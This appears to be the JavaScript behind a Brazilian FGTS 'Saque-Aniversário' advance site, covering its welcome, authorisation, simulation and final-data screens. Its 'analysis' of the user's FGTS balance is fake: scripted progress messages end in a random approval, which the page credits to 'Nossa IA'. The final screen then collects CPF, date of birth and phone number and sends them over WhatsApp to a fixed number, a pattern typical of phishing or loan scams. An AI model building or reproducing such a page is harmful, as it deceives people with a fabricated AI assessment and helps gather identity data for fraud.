document.addEventListener('DOMContentLoaded', () => {

    // --- Seletores de Elementos Globais ---
    const body = document.body;
    const startButton = document.getElementById('startButton');
    const authButton = document.getElementById('authButton');
    
    // Elementos da tela de simulação
    const simulateCpfButton = document.getElementById('simulateCpfButton');
    const cpfSimulationInput = document.getElementById('cpfSimulation');
    const cpfSimulationFeedback = document.getElementById('cpfSimulationFeedback');
    const cpfSimulationGroup = document.getElementById('cpfSimulationGroup');
    const loadingIndicator = document.getElementById('loadingIndicator');
    const progressBar = document.querySelector('.progress');
    const loadingSteps = document.querySelector('.loading-steps');
    const simulationOutcomeMessage = document.getElementById('simulationOutcomeMessage');
    const outcomeTitle = document.getElementById('outcomeTitle');
    const outcomeText = document.getElementById('outcomeText');
    const actionButtonsContainer = document.getElementById('actionButtonsContainer');
    const bottomButtonContainer = document.getElementById('bottomButtonContainer');
    
    // Elementos da tela de dados finais
    const finalizeWhatsappButton = document.getElementById('finalizeWhatsappButton');
    const cpfInput = document.getElementById('cpf');
    const dobInput = document.getElementById('dob');
    const phoneInput = document.getElementById('phone');
    const cpfFeedback = document.getElementById('cpfFeedback');
    const dobFeedback = document.getElementById('dobFeedback');
    const phoneFeedback = document.getElementById('phoneFeedback');

    // --- Funções de Máscara ---
    const applyCpfMask = (inputElement) => {
        if (!inputElement) return;
        inputElement.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            if (value.length > 0) formattedValue += value.substring(0, 3);
            if (value.length > 3) formattedValue += '.' + value.substring(3, 6);
            if (value.length > 6) formattedValue += '.' + value.substring(6, 9);
            if (value.length > 9) formattedValue += '-' + value.substring(9, 11);
            e.target.value = formattedValue;
        });
    };
    
    const applyPhoneMask = (inputElement) => {
        if (!inputElement) return;
        inputElement.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            if (value.length > 0) {
                formattedValue += '(' + value.substring(0, 2);
                if (value.length > 2) {
                    if (value.length >= 7 && (value[2] === '9' || value[2] === '8' || value[2] === '7')) {
                        formattedValue += ') ' + value.substring(2, 7);
                        if (value.length > 7) formattedValue += '-' + value.substring(7, 11);
                    } else {
                        formattedValue += ') ' + value.substring(2, 6);
                        if (value.length > 6) formattedValue += '-' + value.substring(6, 10);
                    }
                }
            }
            e.target.value = formattedValue;
        });
    };

    // --- Função de Validação de CPF (Básica) ---
    const isValidCPF = (cpf) => {
        cpf = cpf.replace(/\D/g, '');
        if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
        let sum = 0;
        let remainder;
        for (let i = 1; i <= 9; i++) sum = sum + parseInt(cpf.substring(i - 1, i)) * (11 - i);
        remainder = (sum * 10) % 11;
        if ((remainder === 10) || (remainder === 11)) remainder = 0;
        if (remainder !== parseInt(cpf.substring(9, 10))) return false;
        sum = 0;
        for (let i = 1; i <= 10; i++) sum = sum + parseInt(cpf.substring(i - 1, i)) * (12 - i);
        remainder = (sum * 10) % 11;
        if ((remainder === 10) || (remainder === 11)) remainder = 0;
        if (remainder !== parseInt(cpf.substring(10, 11))) return false;
        return true;
    };

    // --- Navegação e Lógica de Páginas ---

    // Botão "Começar Agora" na Welcome Screen
    if (startButton) {
        startButton.addEventListener('click', () => {
            applyClickEffect(startButton);
            setTimeout(() => { window.location.href = 'auth.html'; }, 300);
        });
    }

    // Botão "Já Autorizei" na Auth Screen
    if (authButton) {
        authButton.addEventListener('click', () => {
            applyClickEffect(authButton);
            setTimeout(() => { window.location.href = 'simulation.html'; }, 300);
        });
    }

    // Lógica da Simulação (Simulation Screen)
    if (cpfSimulationInput) {
        applyCpfMask(cpfSimulationInput);
        cpfSimulationInput.addEventListener('keydown', (e) => {
            if ([8, 46, 9, 27, 13, 37, 38, 39, 40].indexOf(e.keyCode) !== -1) {
                return;
            }
            if (e.key.length === 1 && /\D/.test(e.key)) {
                e.preventDefault();
            }
        });
    }

    if (simulateCpfButton) {
        simulateCpfButton.addEventListener('click', () => {
            applyClickEffect(simulateCpfButton);
            const cpf = cpfSimulationInput ? cpfSimulationInput.value.replace(/\D/g, '') : '';

            // Validação do CPF
            if (!isValidCPF(cpf)) {
                if (cpfSimulationFeedback) {
                    cpfSimulationFeedback.textContent = 'CPF inválido. Por favor, verifique o número.';
                    cpfSimulationFeedback.style.display = 'block';
                }
                if (cpfSimulationInput) cpfSimulationInput.focus();
                return;
            } else {
                if (cpfSimulationFeedback) cpfSimulationFeedback.style.display = 'none';
            }

            // Inicia o processo de simulação
            if (cpfSimulationGroup) cpfSimulationGroup.style.display = 'none';
            if (bottomButtonContainer) bottomButtonContainer.style.display = 'none';
            if (simulationOutcomeMessage) simulationOutcomeMessage.style.display = 'none';
            if (loadingIndicator) loadingIndicator.style.display = 'flex';
            
            if (progressBar) progressBar.style.width = '0%';

            let progress = 0;
            const messages = [
                'Conectando-se ao seu perfil FGTS...',
                'Verificando elegibilidade para o Saque-Aniversário...',
                'Analisando seu saldo e histórico de trabalho...',
                'Calculando a melhor proposta de antecipação...',
                'Concluindo a análise inteligente...'
            ];
            let currentMessageIndex = 0;
            if (loadingSteps) loadingSteps.textContent = messages[currentMessageIndex];

            const interval = setInterval(() => {
                progress += 5;
                if (progressBar) progressBar.style.width = `${progress}%`;

                if (progress > 10 && progress <= 90 && progress % 20 === 0) {
                    currentMessageIndex++;
                    if (loadingSteps && currentMessageIndex < messages.length) {
                        loadingSteps.textContent = messages[currentMessageIndex];
                    }
                }

                if (progress >= 100) {
                    clearInterval(interval);
                    setTimeout(() => {
                        if (loadingIndicator) loadingIndicator.style.display = 'none';
                        
                        const hasValue = Math.random() > 0.3; // Simulação de sucesso/falha

                        if (actionButtonsContainer) actionButtonsContainer.innerHTML = '';

                        if (hasValue) {
                            if (outcomeTitle) outcomeTitle.textContent = '🎉 Proposta Aprovada!';
                            if (outcomeText) outcomeText.innerHTML = 'Parabéns! Nossa IA encontrou um valor disponível para você. Prossiga para os próximos passos e libere seu saque.';
                            if (simulationOutcomeMessage) simulationOutcomeMessage.style.display = 'block';

                            const continueButton = document.createElement('button');
                            continueButton.id = 'continueToWhatsappButton';
                            continueButton.className = 'main-button primary-orange interactive';
                            continueButton.innerHTML = '<i class="fab fa-whatsapp"></i> Liberar Meu FGTS Agora!';
                            continueButton.addEventListener('click', () => {
                                applyClickEffect(continueButton);
                                setTimeout(() => { window.location.href = 'finaldata.html'; }, 300);
                            });
                            actionButtonsContainer.appendChild(continueButton);
                        } else {
                            if (outcomeTitle) outcomeTitle.textContent = '😔 Sem Saldo Disponível no Momento.';
                            if (outcomeText) outcomeText.innerHTML = 'Nossa IA não identificou valores disponíveis para saque-aniversário neste momento. Para mais informações, fale com nosso especialista.';
                            if (simulationOutcomeMessage) simulationOutcomeMessage.style.display = 'block';

                            const whatsappSupportButton = document.createElement('button');
                            whatsappSupportButton.id = 'whatsappSupportButton';
                            whatsappSupportButton.className = 'main-button primary-orange interactive';
                            whatsappSupportButton.innerHTML = '<i class="fab fa-whatsapp"></i> Falar com Suporte';
                            whatsappSupportButton.onclick = () => {
                                applyClickEffect(whatsappSupportButton);
                                const phoneNumber = '5511978311920';
                                const message = encodeURIComponent(`Olá, meu CPF é ${cpf}. Após a simulação no aplicativo, não foi encontrado valor. Poderiam me ajudar?`);
                                setTimeout(() => { window.open(`https://wa.me/${phoneNumber}?text=${message}`, '_blank'); }, 200);
                            };
                            actionButtonsContainer.appendChild(whatsappSupportButton);

                            const tryAgainButton = document.createElement('button');
                            tryAgainButton.id = 'tryAgainButton';
                            tryAgainButton.className = 'main-button secondary-button interactive';
                            tryAgainButton.innerHTML = '<i class="fas fa-redo-alt"></i> Tentar Novamente';
                            tryAgainButton.onclick = () => {
                                applyClickEffect(tryAgainButton);
                                setTimeout(() => {
                                    if (simulationOutcomeMessage) simulationOutcomeMessage.style.display = 'none';
                                    if (cpfSimulationGroup) cpfSimulationGroup.style.display = 'block';
                                    if (bottomButtonContainer) bottomButtonContainer.style.display = 'flex';
                                    if (cpfSimulationInput) {
                                        cpfSimulationInput.value = '';
                                        cpfSimulationInput.focus();
                                    }
                                }, 300);
                            };
                            actionButtonsContainer.appendChild(tryAgainButton);
                        }
                    }, 800);
                }
            }, 80);
        });
    }

    // Lógica da Final Data Screen
    if (cpfInput) {
        applyCpfMask(cpfInput);
        cpfInput.addEventListener('keydown', (e) => {
            if ([8, 46, 9, 27, 13, 37, 38, 39, 40].indexOf(e.keyCode) !== -1) return;
            if (e.key.length === 1 && /\D/.test(e.key)) e.preventDefault();
        });
    }
    if (phoneInput) {
        applyPhoneMask(phoneInput);
        phoneInput.addEventListener('keydown', (e) => {
            if ([8, 46, 9, 27, 13, 37, 38, 39, 40].indexOf(e.keyCode) !== -1) return;
            if (e.key.length === 1 && /\D/.test(e.key)) e.preventDefault();
        });
    }

    if (finalizeWhatsappButton) {
        finalizeWhatsappButton.addEventListener('click', () => {
            applyClickEffect(finalizeWhatsappButton);
            const cpf = cpfInput ? cpfInput.value.replace(/\D/g, '') : '';
            const dob = dobInput ? dobInput.value : '';
            const phone = phoneInput ? phoneInput.value.replace(/\D/g, '') : '';
            let isValid = true;

            if (!isValidCPF(cpf)) {
                if (cpfFeedback) { cpfFeedback.textContent = 'CPF inválido. Verifique o número.'; cpfFeedback.style.display = 'block'; }
                isValid = false; if (cpfInput) cpfInput.focus();
            } else { if (cpfFeedback) cpfFeedback.style.display = 'none'; }
            if (!dobInput || !dob) {
                if (dobFeedback) { dobFeedback.textContent = 'Informe sua data de nascimento.'; dobFeedback.style.display = 'block'; }
                isValid = false; if (dobInput) dobInput.focus();
            } else { if (dobFeedback) dobFeedback.style.display = 'none'; }
            if (!phoneInput || phone.length < 10 || phone.length > 11) {
                if (phoneFeedback) { phoneFeedback.textContent = 'Telefone inválido. Formato: (XX) XXXX-XXXX ou (XX) 9XXXX-XXXX'; phoneFeedback.style.display = 'block'; }
                isValid = false; if (phoneInput) phoneInput.focus();
            } else { if (phoneFeedback) phoneFeedback.style.display = 'none'; }

            if (isValid) {
                const formattedCpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
                const formattedDob = dob.split('-').reverse().join('/');
                const formattedPhone = phone.replace(/(\d{2})(\d{4,5})(\d{4})/, '($1) $2-$3');
                const messageContent = `Olá, gostaria de finalizar minha solicitação de Saque FGTS.\nMeus dados:\nCPF: ${formattedCpf}\nData de Nasc.: ${formattedDob}\nTelefone: ${formattedPhone}`;
                const phoneNumber = '5511978311920';
                const message = encodeURIComponent(messageContent);
                setTimeout(() => { window.open(`https://wa.me/${phoneNumber}?text=${message}`, '_blank'); }, 200);
            }
        });
    }

    // Lógica do Botão Voltar
    document.querySelectorAll('.back-button').forEach(button => {
        button.addEventListener('click', (event) => {
            event.preventDefault();
            applyClickEffect(button);
            setTimeout(() => { window.history.back(); }, 200);
        });
    });

    // Feedback Visual de Clique
    function applyClickEffect(element) {
        element.classList.add('active');
        requestAnimationFrame(() => {
            setTimeout(() => { element.classList.remove('active'); }, 300);
        });
    }
    document.querySelectorAll('.interactive').forEach(element => {
        element.addEventListener('mouseup', () => { applyClickEffect(element); });
        element.addEventListener('touchend', (event) => { event.preventDefault(); applyClickEffect(element); });
        element.addEventListener('mouseleave', () => { element.classList.remove('active'); });
        element.addEventListener('touchcancel', () => { element.classList.remove('active'); });
    });
});
